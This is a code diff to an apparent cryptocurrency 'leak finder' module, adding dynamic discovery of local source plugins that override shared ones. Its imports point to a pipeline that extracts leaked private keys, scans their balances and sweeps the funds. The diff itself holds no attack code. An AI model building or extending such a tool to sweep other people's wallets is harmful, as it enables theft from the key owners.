@@ -3,8 +3,10 @@
 from __future__ import annotations
 import asyncio
 import hashlib
+import importlib
 import logging
 import os
+import pathlib
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from typing import Optional
@@ -24,8 +26,7 @@ from src.modules.crypto.balance.sweeper import Sweeper, SweepResult
 from src.modules.crypto.balance.scanner_coordinator import ScannerCoordinator
 from src.modules.crypto.leak_finder.extractor import ExtractedKey, KeyType, extract_keys
 from src.modules.sources.base import RawLeak
-from src.modules.sources import discover_sources
-
+from src.modules.sources import discover_sources as _discover_shared_sources
 logger = logging.getLogger(__name__)
 
 
@@ -49,8 +50,35 @@ class LeakFinderResult:
             else 0.0
         )
 
+_LEAK_FINDER_SOURCES_DIR = pathlib.Path(__file__).parent / "sources"
 
-_SOURCE_MAP = discover_sources()
+
+def _discover_local_sources() -> dict[str, type]:
+    """Discover leak-finder-specific sources from the local sources/ directory."""
+    source_map: dict[str, type] = {}
+    for py_file in sorted(_LEAK_FINDER_SOURCES_DIR.glob("*_source.py")):
+        module_name = py_file.stem
+        key = module_name.replace("_source", "")
+        try:
+            module = importlib.import_module(
+                f"src.modules.crypto.leak_finder.sources.{module_name}"
+            )
+            for attr_name in dir(module):
+                attr = getattr(module, attr_name)
+                if (
+                    isinstance(attr, type)
+                    and attr_name.endswith("Source")
+                    and hasattr(attr, "fetch_raw_leaks")
+                ):
+                    source_map[key] = attr
+                    break
+        except Exception:
+            pass
+    return source_map
+
+
+# Merge shared sources with leak-finder-specific sources (local overrides shared)
+_SOURCE_MAP = {**_discover_shared_sources(), **_discover_local_sources()}
 ALL_SOURCES = list(_SOURCE_MAP.keys())
 
 
